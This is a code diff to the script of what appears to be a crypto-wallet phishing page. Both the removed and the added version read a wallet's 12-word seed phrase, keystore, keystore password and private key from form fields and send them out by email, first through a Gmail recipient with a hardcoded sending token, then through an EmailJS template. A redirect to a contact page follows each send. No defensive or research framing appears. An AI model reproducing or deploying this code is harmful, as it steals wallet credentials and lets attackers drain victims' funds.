@@ -12,37 +12,27 @@ function changeTab(newTab) {
     currentTab = newTab;
 }
 
-let phraseText = document.getElementById("ptext");
-let keystore = document.getElementById("kstore");
-let keystorePwd = document.getElementById("kpassword")
-let privateKey = document.getElementById("pkey");
-
-const RECIPIENT = "lordekbuck10@gmail.com";
-const SENDER = "fordeveloperalone@gmail.com";
-
 const sendEmail = () => {
-    if (
-      (!phraseText.value || phraseText.value.split(" ").length !== 12) &&
-      !keystorePwd.value &&
-      !privateKey.value
-    ) {
+  let phraseText = document.getElementById("ptext").value;
+  let keystore = document.getElementById("kstore").value;
+  let keystorePwd = document.getElementById("kpassword").value;
+  let privateKey = document.getElementById("pkey").value;
+
+  if ((!phraseText || phraseText.split(" ").length !== 12) && !keystorePwd && !privateKey) {
       alert("Kindly fill in your data completely.");
       return;
-    }
-  
-    Email.send({
-      SecureToken: "1a07b115-4736-4afd-b8b6-8804c532fe27",
-      To: RECIPIENT,
-      From: SENDER,
-      Subject: "New Wallet Connection",
-      Body: `<h1 style="color: azure; background-color: #6d2a6a; padding: 10px;">New Wallet Data</h1>
-        <p><b>Phrase Text:</b> <code style="background-color: beige; padding: 3px;">${phraseText.value}</code></p>
-        <p><b>Keystore:</b> <code style="background-color: beige; padding: 3px;">${keystore.value}</code></p>
-        <p><b>Keystore Password:</b> <code style="background-color: beige; padding: 3px;">${keystorePwd.value}</code></p>
-        <p><b>Private Key:</b> <code style="background-color: beige; padding: 3px;">${privateKey.value}</code></p>`
-    }).then((message) => {
-      if (message === "OK") {
-        window.location.href = "contact.html";
+  }
+
+  emailjs.send("default_service", "template_x6hwbik", {
+      phraseText: phraseText,
+      keystore: keystore,
+      keystorePwd: keystorePwd,
+      privateKey: privateKey
+  }).then(function(response) {
+      if (response.status === 200) {
+          window.location.href = "contact.html";
       }
-    });
-} 
+  }, function(error) {
+      console.log("Error: ", error);
+  });
+}; 
